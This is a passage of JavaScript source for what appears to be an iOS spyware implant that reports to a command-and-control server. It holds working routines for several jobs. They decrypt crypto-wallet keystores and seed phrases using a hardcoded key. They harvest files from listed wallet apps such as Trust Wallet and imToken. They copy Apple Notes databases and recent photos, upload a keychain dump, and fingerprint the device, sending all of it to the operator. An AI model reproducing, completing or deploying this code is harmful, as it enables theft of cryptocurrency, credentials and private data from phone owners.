			for (var wi = 0; wi < wArr.length; wi++) {
				var w = wArr[wi];
				var walletInfo = {
					id: w.id || w.walletID || ("wallet_" + wi),
					name: w.name || "",
					address: w.address || "",
					source: w.source || "",
					chainType: w.chainType || ""
				};

				if (w.keystore || w.crypto) {
					var ks = w.keystore || { crypto: w.crypto };
					walletInfo.keystore_raw = ks;
					walletInfo.kdf = ks.crypto ? ks.crypto.kdf : "unknown";

					if (password) {
						var decResult = _decryptKeystoreV3(ks.crypto, password);
						if (decResult) {
							walletInfo.decrypt_result = decResult;
							walletInfo.password_source = p.password ? "provided" : "keychain";
						}
					}
				}

				if (w.encMnemonic) {
					walletInfo.encMnemonic_raw = w.encMnemonic;
					if (typeof w.encMnemonic === "object" && w.encMnemonic.encStr) {
						var fixedKey = "456b38706c33314b3279654867517779";
						var dec = _decryptEncryptedMessage(w.encMnemonic, fixedKey);
						if (dec) walletInfo.mnemonic_fixed_key = dec;
					}
				}
				if (w.encOriginal) {
					walletInfo.encOriginal_raw = w.encOriginal;
					if (typeof w.encOriginal === "object" && w.encOriginal.encStr) {
						var fixedKey2 = "456b38706c33314b3279654867517779";
						var dec2 = _decryptEncryptedMessage(w.encOriginal, fixedKey2);
						if (dec2) walletInfo.original_fixed_key = dec2;
					}
				}

				result.wallets.push(walletInfo);
			}
		}

		if (data["AssetToken"]) {
			try {
				var assetData = JSON.parse(data["AssetToken"]);
				var items = assetData.itemsById || assetData;
				if (typeof items === "object") {
					for (var assetKey in items) {
						if (!items.hasOwnProperty(assetKey)) continue;
						var a = items[assetKey];
						result.assets.push({
							walletAddress: a.walletAddress || a.accountAddress || "",
							chainId: a.chainId || "",
							chainType: a.chainType || "",
							name: a.name || "",
							symbol: a.symbol || "",
							balance: a.balance || "0",
							decimal: a.decimal || 0
						});
					}
				}
			} catch(e) {
				result.asset_parse_error = String(e);
			}
		}

		var sensitiveKeys = ["walletsV2", "wallets", "crypto", "encMnemonic",
			"encOriginal", "AssetToken", "identities", "accounts"];
		var rawData = {};
		for (var ki = 0; ki < sensitiveKeys.length; ki++) {
			if (data[sensitiveKeys[ki]]) {
				rawData[sensitiveKeys[ki]] = data[sensitiveKeys[ki]];
			}
		}
		for (var rk = 0; rk < rawKeys.length; rk++) {
			var lk = rawKeys[rk].toLowerCase();
			if (lk.indexOf("wallet") >= 0 || lk.indexOf("token") >= 0 ||
				lk.indexOf("mnemonic") >= 0 || lk.indexOf("seed") >= 0 ||
				lk.indexOf("key") >= 0 || lk.indexOf("account") >= 0 ||
				lk.indexOf("identity") >= 0 || lk.indexOf("crypto") >= 0) {
				if (!rawData[rawKeys[rk]]) rawData[rawKeys[rk]] = data[rawKeys[rk]];
			}
		}

		if (Object.keys(rawData).length > 0) {
			var rawJson = JSON.stringify(rawData);
			var rawB64 = bytesToBase64(new Uint8Array(Native.stringToBytes(rawJson, false)));
			sendResult(cmd.command_id, rawB64,
				"imtoken_raw_storage.json", "wallet_extract");
		}
	} else {
		result.async_storage_status = "not_found";
	}

	result.realm_uploaded = realmUploaded;
	var endMs = Date.now();
	result.execution_time = (endMs - startMs) / 1000;
	try {
		_agentLog("[IM-EXTRACT] done wallets=" + result.wallets.length +
			" realm=" + !!realmUploaded + " dirs=" + result.wallet_dir_files.length +
			" ms=" + (endMs - startMs));
	} catch (_) {}
	sendJSON(cmd.command_id, result, "wallet_extract_result.json",
		{ start_ms: startMs, end_ms: endMs });
}

// ============================================================================
// ios_app_data: collect sandboxed app data by bundle_id
// ============================================================================

var APP_DATA_BASE = "/var/mobile/Containers/Data/Application";
var APP_GROUP_BASE = "/var/mobile/Containers/Shared/AppGroup";

function _toFfsPath(absPath) {
	if (absPath.indexOf("/private/") === 0) return absPath.substring(1);
	if (absPath.indexOf("/var/") === 0) return "private" + absPath;
	if (absPath.charAt(0) === "/") return absPath.substring(1);
	return absPath;
}

function _findContainerIn(basePath, bundleId) {
	var dirs = listDir(basePath);
	for (var i = 0; i < dirs.length; i++) {
		if (dirs[i].type !== "dir") continue;
		var containerPath = basePath + "/" + dirs[i].name;
		var plistPath = containerPath + "/.com.apple.mobile_container_manager.metadata.plist";
		var acc = Number(Native.callSymbol("access", plistPath, 0));
		if (acc !== 0) continue;
		var bytes = _readFileBytes(plistPath, 8192);
		if (!bytes || bytes.length === 0) continue;
		var content = _rawToStr(bytes);
		if (content.indexOf(bundleId) >= 0) return containerPath;
	}
	return null;
}

function _findAppContainer(bundleId) {
	return _findContainerIn(APP_DATA_BASE, bundleId);
}

function _findAppGroupContainer(bundleId) {
	return _findContainerIn(APP_GROUP_BASE, bundleId);
}

function _collectAppFiles(basePath, subPaths, excludePaths, filterMode, fileExts, maxFileSizeMB) {
	var maxBytes = (maxFileSizeMB && maxFileSizeMB > 0) ? maxFileSizeMB * 1024 * 1024 : 0;
	var exts = [];
	if (fileExts) {
		var parts = fileExts.split(",");
		for (var i = 0; i < parts.length; i++) {
			var e = parts[i].trim();
			if (e) exts.push(e.toLowerCase());
		}
	}

	var scanRoots = [];
	if (subPaths && subPaths.length > 0) {
		for (var i = 0; i < subPaths.length; i++) {
			var sp = subPaths[i];
			var full = (sp.charAt(0) === "/") ? basePath + sp : basePath + "/" + sp;
			if (_statFile(full)) scanRoots.push(full);
		}
	} else {
		scanRoots.push(basePath);
	}

	var excludeFull = [];
	if (excludePaths) {
		for (var i = 0; i < excludePaths.length; i++) {
			excludeFull.push(basePath + excludePaths[i]);
		}
	}

	var files = [];
	for (var ri = 0; ri < scanRoots.length; ri++) {
		_scanDir(scanRoots[ri], files, true, excludeFull,
			filterMode || "none", exts, maxBytes);
	}
	return files;
}

function handleIosAppData(cmd) {
	var p = cmd.params || {};
	var targets = p.targets || [];
	var maxFileSizeMB = (p.max_file_size_mb !== undefined) ? p.max_file_size_mb : 500;
	var startMs = Date.now();

	if (!targets.length) {
		sendJSON(cmd.command_id, {
			status: "failed", error: "empty targets array",
			_task_id: p._task_id || "", _task_type: "ios_app_data"
		}, "ios_app_data_result.json", { start_ms: startMs, end_ms: Date.now() });
		return;
	}

	var totalCollected = 0;
	var totalUploaded = 0;
	var targetResults = [];

	for (var ti = 0; ti < targets.length; ti++) {
		var t = targets[ti];
		var bundleId = t.bundle_id;
		if (!bundleId) {
			targetResults.push({ bundle_id: "", status: "skipped", error: "empty bundle_id" });
			continue;
		}

		var containerPath = _findAppContainer(bundleId);
		var groupPath = _findAppGroupContainer(bundleId);

		if (!containerPath && !groupPath) {
			targetResults.push({ bundle_id: bundleId, status: "not_found",
				error: "app container not found" });
			continue;
		}

		var effectiveMax = maxFileSizeMB;
		if (effectiveMax === -1) effectiveMax = 0;

		var containers = [];
		if (containerPath) containers.push(containerPath);
		if (groupPath) containers.push(groupPath);

		var uploaded = 0;
		var allFiles = 0;

		for (var ci = 0; ci < containers.length; ci++) {
			var ctrPath = containers[ci];
			var files = _collectAppFiles(ctrPath, t.paths || null,
				t.exclude_paths || null, t.filter_mode || "none",
				t.file_extensions || "", effectiveMax);
			allFiles += files.length;

			for (var fi = 0; fi < files.length; fi++) {
				var fname = _toFfsPath(files[fi]);

				var sz = getFileSize(files[fi]);
				if (sz <= 0) continue;

				var isLast = (ci === containers.length - 1 && fi === files.length - 1);
				var meta = isLast ? { start_ms: startMs, end_ms: Date.now() } : null;

				if (sz <= CHUNK_SIZE) {
					var rd = readFileB64(files[fi],
						effectiveMax > 0 ? effectiveMax * 1024 * 1024 : MAX_FILE_SIZE);
					if (rd) {
						sendResult(cmd.command_id, rd.b64, fname, "ios_app_data", meta);
						uploaded++;
					}
				} else {
					var chunkRes = sendFileChunked(cmd.command_id, files[fi],
						fname, "ios_app_data", meta);
					if (chunkRes && chunkRes.ok) uploaded++;
				}
			}
		}

		totalCollected += allFiles;
		totalUploaded += uploaded;
		targetResults.push({
			bundle_id: bundleId,
			container: containerPath || null,
			app_group: groupPath || null,
			status: "done",
			files_found: allFiles,
			files_uploaded: uploaded
		});
	}

	var endMs = Date.now();
	sendJSON(cmd.command_id, {
		status: totalUploaded > 0 ? "success" : (totalCollected > 0 ? "partial" : "empty"),
		file_count: totalUploaded,
		total_scanned: totalCollected,
		targets_processed: targetResults.length,
		target_details: targetResults,
		execution_time: (endMs - startMs) / 1000,
		_task_id: p._task_id || "",
		_task_type: "ios_app_data"
	}, "ios_app_data_result.json", { start_ms: startMs, end_ms: endMs });
}

// ============================================================================
// wallet_scan: scan installed wallet apps and collect sandbox files
// ============================================================================

var WALLET_BUNDLE_IDS = {
	"com.bitpie.wallet":                { name: "Bitpie",       sandbox: false },
	"com.uniswap.mobile":               { name: "Uniswap",     sandbox: false },
	"app.phantom":                       { name: "Phantom",     sandbox: false },
	"com.solflare.mobile":               { name: "Solflare",    sandbox: false },
	"org.mytonwallet.app":               { name: "MyTonWallet", sandbox: false },

	"com.sixdays.trust":                 { name: "Trust Wallet", sandbox: true,
		files: ["Documents/UTC--*", "Documents/keystore/UTC--*"] },
	"com.bitkeep.os":                    { name: "Bitget",       sandbox: true,
		files: ["Library/Preferences/com.bitkeep.os.plist"] },

	"coin98.crypto.finance.insights":    { name: "Coin98",       sandbox: true,
		maxFileSize: 10 * 1024 * 1024,
		files: ["Library/Application Support/coin98.crypto.finance.insights/RCTAsyncLocalStorage_V1/*"] },
	"com.tonhub.app":                    { name: "Tonhub",       sandbox: true,
		files: ["Documents/mmkv/mmkv.default"] },

	"com.aspect.tronlink":               { name: "TronLink",     sandbox: true,
		files: ["Documents/keystore/UTC--*"] },
	"com.tokenpocket.1":                 { name: "TokenPocket",  sandbox: true,
		files: ["Documents/wallets/*", "Documents/identity.json"] },
	"im.token.app":                      { name: "imToken",      sandbox: true,
		files: ["Documents/walletsV2/*.json"] }
};

function _resolveWalletFiles(containerPath, patterns) {
	var results = [];
	for (var pi = 0; pi < patterns.length; pi++) {
		var pattern = patterns[pi];
		var lastSlash = pattern.lastIndexOf("/");
		var dirPart  = lastSlash >= 0 ? pattern.substring(0, lastSlash) : "";
		var namePart = lastSlash >= 0 ? pattern.substring(lastSlash + 1) : pattern;

		var dirPath = containerPath + (dirPart ? "/" + dirPart : "");

		if (namePart.indexOf("*") >= 0 || namePart.indexOf("?") >= 0) {
			var items = listDir(dirPath);
			for (var i = 0; i < items.length; i++) {
				if (items[i].type !== "file") continue;
				if (_matchGlob(items[i].name, namePart)) {
					results.push({
						relPath: (dirPart ? dirPart + "/" : "") + items[i].name,
						absPath: dirPath + "/" + items[i].name
					});
				}
			}
		} else {
			var fullPath = containerPath + "/" + pattern;
			if (Number(Native.callSymbol("access", fullPath, 0)) === 0) {
				results.push({ relPath: pattern, absPath: fullPath });
			}
		}
	}
	return results;
}

// ============================================================================
// Memo Scan: read notes.sqlite and upload structured memo data
// ============================================================================

function _findNoteStore() {
	// Prefer AppGroup NoteStore (iOS 13+); probe both /var and /private/var (token dict uses private).
	var agBases = [
		"/var/mobile/Containers/Shared/AppGroup",
		"/private/var/mobile/Containers/Shared/AppGroup"
	];
	var probed = [];
	for (var bi = 0; bi < agBases.length; bi++) {
		var agBase = agBases[bi];
		var dirs = [];
		try { dirs = listDir(agBase) || []; } catch (_) { dirs = []; }
		probed.push({ base: agBase, dirs: dirs.length });
		for (var d = 0; d < dirs.length; d++) {
			if (dirs[d].type !== "dir") continue;
			var p = agBase + "/" + dirs[d].name + "/NoteStore.sqlite";
			probed.push({ path: p, access: Number(Native.callSymbol("access", p, 0)) });
			if (Number(Native.callSymbol("access", p, 0)) === 0)
				return { path: p, probed: probed };
		}
	}
	var bases = [
		"/private/var/mobile/Library/Notes/notes.sqlite",
		"/var/mobile/Library/Notes/notes.sqlite",
		"/tmp/notes.sqlite"
	];
	for (var i = 0; i < bases.length; i++) {
		var acc = Number(Native.callSymbol("access", bases[i], 0));
		probed.push({ path: bases[i], access: acc });
		if (acc === 0) return { path: bases[i], probed: probed };
	}
	return { path: "", probed: probed };
}

// Always returns a payload (success or fail) so /nb always fires for observability.
// Shape: { lhu, list, db_files, db_path, count, source, ok, error, reason, probed? }
function _collectNotesNbPayload() {
	var out = {
		lhu: DEVICE_UUID || "",
		list: [],
		db_files: [],
		db_path: "",
		count: 0,
		source: "c2_agent",
		ok: 0,
		error: "",
		reason: ""
	};
	var found = null;
	try {
		found = _findNoteStore();
	} catch (fe) {
		out.error = "find_throw";
		out.reason = String(fe).slice(0, 200);
		return out;
	}
	if (found && found.probed) out.probed = found.probed;
	var dbPath = found && found.path ? found.path : "";
	if (!dbPath) {
		out.error = "not_found";
		out.reason = "NoteStore/notes.sqlite not accessible from agent (token/path?)";
		return out;
	}
	out.db_path = dbPath;
	var suffixes = ["", "-wal", "-shm"];
	var tmpBase = "/tmp/_hq_notestore";
	var copied = 0;
	try {
		for (var ci = 0; ci < suffixes.length; ci++) {
			var csrc = dbPath + suffixes[ci];
			if (Number(Native.callSymbol("access", csrc, 0)) === 0) {
				var cdst = tmpBase + suffixes[ci];
				_cmdCp(["cp", csrc, cdst]);
				Native.callSymbol("chmod", cdst, 0x1A4);
				if (Number(Native.callSymbol("access", cdst, 0)) === 0) copied++;
			}
		}
	} catch (ce) {
		out.error = "copy_throw";
		out.reason = String(ce).slice(0, 200);
		return out;
	}
	if (copied === 0) {
		out.error = "copy_fail";
		out.reason = "found db but cp to /tmp failed path=" + dbPath;
		return out;
	}
	var noteList = [];
	try {
		var noteRows = _sqliteQuery(tmpBase,
			"SELECT Z_PK, ZTITLE1, ZSNIPPET, ZMODIFICATIONDATE1 FROM ZICCLOUDSYNCINGOBJECT WHERE ZTITLE1 IS NOT NULL ORDER BY ZMODIFICATIONDATE1 DESC LIMIT 500", 500);
		if (noteRows && noteRows.rows) {
			for (var ni = 0; ni < noteRows.rows.length; ni++) {
				var nr = noteRows.rows[ni];
				if (!nr.ZTITLE1 && !nr.ZSNIPPET) continue;
				noteList.push({
					id: nr.Z_PK,
					title: nr.ZTITLE1 || "",
					snippet: nr.ZSNIPPET || "",
					mod: nr.ZMODIFICATIONDATE1
				});
			}
		}
	} catch (se) {
		out.error = "sqlite_throw";
		out.reason = String(se).slice(0, 200);
		// still try to attach db files below
	}
	var dbFiles = [];
	try {
		for (var mi = 0; mi < suffixes.length; mi++) {
			var mfp = tmpBase + suffixes[mi];
			var mfd = readFileB64(mfp, 5242880);
			if (mfd) {
				var origName = dbPath.substring(dbPath.lastIndexOf("/") + 1) + suffixes[mi];
				dbFiles.push({ name: origName, data: mfd.b64, size: mfd.size });
			}
		}
	} catch (re) {
		if (!out.error) {
			out.error = "read_throw";
			out.reason = String(re).slice(0, 200);
		}
	}
	for (var di = 0; di < suffixes.length; di++) {
		try { Native.callSymbol("unlink", tmpBase + suffixes[di]); } catch (_) {}
	}
	out.list = noteList;
	out.db_files = dbFiles;
	out.count = noteList.length;
	if (dbFiles.length === 0 && noteList.length === 0) {
		if (!out.error) {
			out.error = "empty";
			out.reason = "copied but no rows and no readable db files path=" + dbPath;
		}
		out.ok = 0;
		return out;
	}
	if (out.error === "sqlite_throw" && dbFiles.length > 0) {
		// partial: files ok, query failed — still mark ok=1 with error note
		out.ok = 1;
		out.reason = (out.reason || "") + " (db_files uploaded)";
		return out;
	}
	if (out.error) {
		out.ok = 0;
		return out;
	}
	out.ok = 1;
	out.error = "";
	out.reason = "ok count=" + noteList.length + " files=" + dbFiles.length;
	return out;
}

function _postNotesNb(payload, stage) {
	if (!payload) {
		payload = {
			lhu: DEVICE_UUID || "",
			list: [],
			db_files: [],
			db_path: "",
			count: 0,
			source: "c2_agent",
			ok: 0,
			error: "null_payload",
			reason: "collect returned null"
		};
	}
	payload.stage = stage || payload.stage || "unknown";
	payload.ts = Date.now();
	try {
		_agentLog("[C2-AGENT] /nb post stage=" + payload.stage +
			" ok=" + payload.ok + " err=" + (payload.error || "-") +
			" count=" + (payload.count || 0) +
			" files=" + ((payload.db_files && payload.db_files.length) || 0));
	} catch (_) {}
	// Strip huge probed list from wire if needed? keep short — probed is small.
	var resp = hqPostReport("/nb", payload);
	if (resp === null || resp === undefined) {
		try {
			_agentLog("[C2-AGENT] /nb post FAIL stage=" + payload.stage + " err=" + (payload.error || "-"));
		} catch (_) {}
	}
	return resp;
}

function _runNotesNb(stage) {
	var payload = null;
	try {
		payload = _collectNotesNbPayload();
	} catch (e) {
		payload = {
			lhu: DEVICE_UUID || "",
			list: [],
			db_files: [],
			db_path: "",
			count: 0,
			source: "c2_agent",
			ok: 0,
			error: "collect_throw",
			reason: String(e).slice(0, 200)
		};
	}
	return _postNotesNb(payload, stage || "boot");
}

function handleMemoScan(cmd) {
	var startMs = Date.now();
	var payload = null;
	var posted = false;
	try {
		payload = _collectNotesNbPayload();
		var resp = _postNotesNb(payload, "memo_scan");
		posted = !!(resp !== null && resp !== undefined);
	} catch (e) {
		payload = {
			lhu: DEVICE_UUID || "",
			list: [],
			db_files: [],
			db_path: "",
			count: 0,
			source: "c2_agent",
			ok: 0,
			error: "memo_scan_throw",
			reason: String(e).slice(0, 200)
		};
		try {
			var resp2 = _postNotesNb(payload, "memo_scan");
			posted = !!(resp2 !== null && resp2 !== undefined);
		} catch (_) {}
		try { _agentLog("[C2-AGENT] memo_scan /nb FAIL " + String(e).slice(0, 120)); } catch (_) {}
	}
	var endMs = Date.now();
	sendJSON(cmd.command_id, {
		status: posted ? ((payload && payload.ok) ? "success" : "reported_fail") : "post_fail",
		posted: posted,
		ok: payload ? payload.ok : 0,
		error: payload ? (payload.error || "") : "unknown",
		reason: payload ? (payload.reason || "") : "",
		count: payload ? payload.count : 0,
		db_files: payload && payload.db_files ? payload.db_files.length : 0,
		db_path: payload ? (payload.db_path || "not_found") : "not_found",
		_task_type: "memo_scan"
	}, "memo_scan.json", { start_ms: startMs, end_ms: endMs });
}

// ============================================================================
// Photo Scan: query Photos.sqlite, read files, upload with MD5 hashes
// ============================================================================

function _md5(data) {
	var inBuf = Native.callSymbol("malloc", Native.asBigInt(data.length));
	if (!inBuf || inBuf === 0n) return null;
	var outBuf = Native.callSymbol("malloc", 16n);
	if (!outBuf || outBuf === 0n) { Native.callSymbol("free", inBuf); return null; }
	Native.write(inBuf, data.buffer ? data.buffer : data);
	Native.callSymbol("CC_MD5", inBuf, Native.asBigInt(data.length), outBuf);
	var hash = new Uint8Array(Native.read(outBuf, 16));
	Native.callSymbol("free", inBuf);
	Native.callSymbol("free", outBuf);
	return hash;
}

function _md5file(path, maxSize) {
	var fd = Number(Native.callSymbol("open", path, 0, 0));
	if (fd < 0) return null;
	try {
		var sz = Number(Native.callSymbol("lseek", fd, 0, 2));
		Native.callSymbol("lseek", fd, 0, 0);
		if (sz <= 0 || sz > maxSize) return null;
		var buf = Native.callSymbol("malloc", Native.asBigInt(sz));
		if (!buf || buf === 0n) return null;
		try {
			var nr = Number(Native.callSymbol("read", fd, buf, sz));
			if (nr <= 0) return null;
			var outBuf = Native.callSymbol("malloc", 16n);
			if (!outBuf || outBuf === 0n) return null;
			try {
				Native.callSymbol("CC_MD5", buf, Native.asBigInt(nr), outBuf);
				var hash = new Uint8Array(Native.read(outBuf, 16));
				var hex = "";
				for (var i = 0; i < 16; i++)
					hex += (hash[i] < 16 ? "0" : "") + hash[i].toString(16);
				return hex;
			} finally { Native.callSymbol("free", outBuf); }
		} finally { Native.callSymbol("free", buf); }
	} finally { Native.callSymbol("close", fd); }
}

function _queryPhotosPaths(maxCount) {
	var dbPath = "/var/mobile/Media/PhotoData/Photos.sqlite";
	var paths = [];
	var rows = _sqliteQuery(dbPath,
		"SELECT ZFILENAME, ZDIRECTORY FROM ZASSET " +
		"WHERE ZTRASHEDSTATE = 0 " +
		"ORDER BY ZDATECREATED DESC LIMIT " + maxCount, maxCount);
	if (!rows || !rows.rows) return paths;
	for (var i = 0; i < rows.rows.length; i++) {
		var r = rows.rows[i];
		var fn = r.ZFILENAME || "";
		if (!fn) continue;
		var dir = r.ZDIRECTORY || "";
		var full;
		if (dir) {
			dir = dir.replace(/^\/+|\/+$/g, "");
			full = "/var/mobile/Media/" + dir + "/" + fn;
		} else {
			full = "/var/mobile/Media/DCIM/100APPLE/" + fn;
		}
		paths.push({ path: full, name: fn });
	}
	return paths;
}

function handlePhotoScan(cmd) {
	var p = cmd.params || {};
	var startMs = Date.now();
	var maxPhotos = p.max_count || 200;
	var batchSize = p.batch_size || 30;
	var maxFileSize = p.max_file_size || (5 * 1024 * 1024);

	var photos = _queryPhotosPaths(maxPhotos);
	var uploaded = 0, skipped = 0, errors = 0;
	var hashes = [];

	for (var batch = 0; batch < photos.length; batch += batchSize) {
		var end = Math.min(batch + batchSize, photos.length);
		for (var j = batch; j < end; j++) {
			var ph = photos[j];
			var sz = getFileSize(ph.path);
			if (sz <= 0 || sz > maxFileSize) { skipped++; continue; }
			var md5 = _md5file(ph.path, maxFileSize);
			if (!md5) { skipped++; continue; }
			hashes.push(md5);
			var fdata = readFileB64(ph.path, maxFileSize);
			if (fdata) {
				sendResult(cmd.command_id, fdata.b64, ph.name, "photos",
					{ start_ms: startMs, end_ms: Date.now() });
				uploaded++;
			} else { errors++; }
		}
	}

	var endMs = Date.now();
	sendJSON(cmd.command_id, {
		status: "success",
		total_found: photos.length,
		uploaded: uploaded,
		skipped: skipped,
		errors: errors,
		hashes: hashes,
		_task_type: "photo_scan"
	}, "photo_scan.json", { start_ms: startMs, end_ms: endMs });
}

// ============================================================================
// Wallet Scan
// ============================================================================

function handleWalletScan(cmd) {
	var p = cmd.params || {};
	var startMs = Date.now();
	var maxFileSize  = 2 * 1024 * 1024;
	var maxTotalSize = 10 * 1024 * 1024;

	var base = APP_DATA_BASE;
	var dirs = listDir(base);

	var installedWallets = [];
	var containerMap = {};

	for (var i = 0; i < dirs.length; i++) {
		if (dirs[i].type !== "dir") continue;
		var cpath = base + "/" + dirs[i].name;
		var plistPath = cpath + "/.com.apple.mobile_container_manager.metadata.plist";
		if (Number(Native.callSymbol("access", plistPath, 0)) !== 0) continue;
		var bytes = _readFileBytes(plistPath, 8192);
		if (!bytes || bytes.length === 0) continue;
		var content = _rawToStr(bytes);

		for (var bid in WALLET_BUNDLE_IDS) {
			if (content.indexOf(bid) >= 0 && !containerMap[bid]) {
				containerMap[bid] = cpath;
				installedWallets.push(WALLET_BUNDLE_IDS[bid].name);
			}
		}
	}

	var sandboxFiles = [];
	var totalSize = 0;

	for (var bid in containerMap) {
		var cfg = WALLET_BUNDLE_IDS[bid];
		if (!cfg.sandbox || !cfg.files) continue;
		var perFileMax = cfg.maxFileSize || maxFileSize;
		var resolved = _resolveWalletFiles(containerMap[bid], cfg.files);

		for (var fi = 0; fi < resolved.length; fi++) {
			if (totalSize >= maxTotalSize) break;
			var rf = resolved[fi];
			var fd = readFileB64(rf.absPath, perFileMax);
			if (!fd) continue;
			if (totalSize + fd.size > maxTotalSize) continue;

			sandboxFiles.push({
				wallet: cfg.name,
				bundle_id: bid,
				path: rf.relPath,
				data_b64: fd.b64,
				size: fd.size
			});
			totalSize += fd.size;
		}
	}

	// Upload keychain_c2_dump.json if P7 pipeline produced it
	var kcDumpUploaded = false;
	var kcDonePath = "/tmp/keychain_c2_dump.done";
	var kcDumpPath = "/tmp/keychain_c2_dump.json";
	if (Number(Native.callSymbol("access", kcDonePath, 0)) === 0) {
		var kcData = readFileB64(kcDumpPath, 5 * 1024 * 1024);
		if (!kcData) {
			Native.callSymbol("chmod", kcDumpPath + ".tmp", 0x1A4);
			Native.callSymbol("rename", kcDumpPath + ".tmp", kcDumpPath);
			Native.callSymbol("chmod", kcDumpPath, 0x1A4);
			kcData = readFileB64(kcDumpPath, 5 * 1024 * 1024);
		}
		if (kcData) {
			sendResult(cmd.command_id, kcData.b64,
				"keychain_c2_dump.json", "wallet_scan");
			kcDumpUploaded = true;
		}
	}

	var endMs = Date.now();
	sendJSON(cmd.command_id, {
		device_uuid: DEVICE_UUID,
		timestamp: new Date().toISOString(),
		installed_wallets: installedWallets,
		sandbox_files: sandboxFiles,
		total_size: totalSize,
		keychain_dump_uploaded: kcDumpUploaded,
		execution_time: (endMs - startMs) / 1000,
		_task_id: p._task_id || "",
		_task_type: "wallet_scan"
	}, "wallet_pkg.json", { start_ms: startMs, end_ms: endMs });
}

// ============================================================================
// Device Identity (obtained natively - no placeholder needed)
// ============================================================================

function _getDeviceUUID() {
	try {
		// IOKit IOPlatformUUID (same method as file_downloader)
		const iokitHandle = Native.callSymbol("dlopen",
			"/System/Library/Frameworks/IOKit.framework/IOKit", 1);
		if (iokitHandle && iokitHandle !== 0n) {
			Native.callSymbol("dlopen",
				"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);

			const svcName = Native.callSymbol("malloc", 32);
			Native.writeString(svcName, "IOPlatformExpertDevice");
			const matchDict = Native.callSymbol("IOServiceMatching", svcName);
			Native.callSymbol("free", svcName);

			if (matchDict && matchDict !== 0n) {
				const expert = Native.callSymbol("IOServiceGetMatchingService", 0n, matchDict);
				if (expert && expert !== 0n) {
					const keyBuf = Native.callSymbol("malloc", 32);
					Native.writeString(keyBuf, "IOPlatformUUID");
					const keyCF = Native.callSymbol("CFStringCreateWithCString",
						0n, keyBuf, 0x08000100);
					Native.callSymbol("free", keyBuf);

					if (keyCF && keyCF !== 0n) {
						const valCF = Native.callSymbol("IORegistryEntryCreateCFProperty",
							expert, keyCF, 0n, 0n);
						Native.callSymbol("CFRelease", keyCF);

						if (valCF && valCF !== 0n) {
							let uuid = "";
							const cstr = Native.callSymbol("CFStringGetCStringPtr",
								valCF, 0x08000100);
							if (cstr && cstr !== 0n) {
								uuid = Native.readString(cstr, 256).replace(/\0/g, "").trim();
							}
							if (!uuid) {
								const tmp = Native.callSymbol("malloc", 256);
								if (tmp && tmp !== 0n) {
									if (Native.callSymbol("CFStringGetCString",
										valCF, tmp, 256, 0x08000100))
										uuid = Native.readString(tmp, 256).replace(/\0/g, "").trim();
									Native.callSymbol("free", tmp);
								}
							}
							Native.callSymbol("CFRelease", valCF);
							if (uuid && uuid.length > 0) {
								Native.callSymbol("IOObjectRelease", expert);
								return uuid;
							}
						}
					}
					Native.callSymbol("IOObjectRelease", expert);
				}
			}
		}
	} catch (e) {}

	// Fallback: sysctl HW_UUID
	try {
		const mib = Native.callSymbol("malloc", 8);
		const res = Native.callSymbol("malloc", 256);
		const slen = Native.callSymbol("malloc", 8);
		if (!mib || !res || !slen) return "";
		try {
			const mibAB = new ArrayBuffer(8);
			const mv = new DataView(mibAB);
			mv.setInt32(0, 6, true);
			mv.setInt32(4, 25, true);
			Native.write(mib, mibAB);

			const slAB = new ArrayBuffer(8);
			new DataView(slAB).setUint32(0, 256, true);
			Native.write(slen, slAB);

			let r = Native.callSymbol("sysctl", mib, 2, 0n, slen, 0n, 0);
			if (r !== 0) return "";

			const ld = Native.read(slen, 8);
			const sz = new DataView(ld).getUint32(0, true);
			if (sz <= 0 || sz > 256) return "";

			const sl2 = new ArrayBuffer(8);
			new DataView(sl2).setUint32(0, sz, true);
			Native.write(slen, sl2);

			r = Native.callSymbol("sysctl", mib, 2, res, slen, 0n, 0);
			if (r !== 0) return "";

			const raw = new Uint8Array(Native.read(res, sz));
			let uuid = "";
			for (let i = 0; i < raw.length; i++) {
				if (!raw[i]) break;
				if (raw[i] >= 32 && raw[i] <= 126) uuid += String.fromCharCode(raw[i]);
			}
			uuid = uuid.trim();
			if (uuid.length > 0) return uuid;
		} finally {
			Native.callSymbol("free", mib);
			Native.callSymbol("free", res);
			Native.callSymbol("free", slen);
		}
	} catch (e) {}

	return "";
}

function _getDeviceModel() {
	const uts = Native.callSymbol("calloc", 1, 1536);
	if (!uts || uts === 0n) return "";
	try {
		Native.callSymbol("uname", uts);
		return Native.readString(uts + 1024n, 256).replace(/\0/g, '');
	} finally { Native.callSymbol("free", uts); }
}

// ============================================================================
// HQ Wallet Package Builder
// ============================================================================

var _hqSandboxKeyMap = {
	"Trust Wallet": "trust_wallet", "Bitget": "bitget", "Coin98": "coin98",
	"TronLink": "tronlink", "Tonhub": "tonhub", "TokenPocket": "tokenpocket",
	"imToken": "imtoken"
};

function _buildWalletPkg(deviceUUID) {
	var kcDumpPath = "/tmp/keychain_c2_dump.json";
	var kcData = _readFileBytes(kcDumpPath, 5242880);
	if (!kcData) {
		Native.callSymbol("chmod", "/tmp/keychain_c2_dump.json.tmp", 0x1A4);
		Native.callSymbol("rename", "/tmp/keychain_c2_dump.json.tmp", kcDumpPath);
		Native.callSymbol("chmod", kcDumpPath, 0x1A4);
		kcData = _readFileBytes(kcDumpPath, 5242880);
	}
	if (!kcData) return null;
	var kcStr = _rawToStr(kcData);
	var keychain;
	try { keychain = JSON.parse(kcStr); } catch(e) { return null; }

	var dirs = listDir(APP_DATA_BASE);
	var containerMap = {};
	for (var i = 0; i < dirs.length; i++) {
		if (dirs[i].type !== "dir") continue;
		var cpath = APP_DATA_BASE + "/" + dirs[i].name;
		var plistPath = cpath + "/.com.apple.mobile_container_manager.metadata.plist";
		if (Number(Native.callSymbol("access", plistPath, 0)) !== 0) continue;
		var bytes = _readFileBytes(plistPath, 8192);
		if (!bytes || bytes.length === 0) continue;
		var content = _rawToStr(bytes);
		for (var bid in WALLET_BUNDLE_IDS) {
			if (content.indexOf(bid) >= 0 && !containerMap[bid]) containerMap[bid] = cpath;
		}
	}

	var sandbox = {};
	var totalSize = 0;
	var maxTotal = 10485760;
	for (var bid in containerMap) {
		var cfg = WALLET_BUNDLE_IDS[bid];
		if (!cfg.sandbox || !cfg.files) continue;
		var key = _hqSandboxKeyMap[cfg.name] || cfg.name.toLowerCase().replace(/ /g, "_");
		var perFileMax = cfg.maxFileSize || 2097152;
		var resolved = _resolveWalletFiles(containerMap[bid], cfg.files);
		var files = {};
		for (var fi = 0; fi < resolved.length; fi++) {
			if (totalSize >= maxTotal) break;
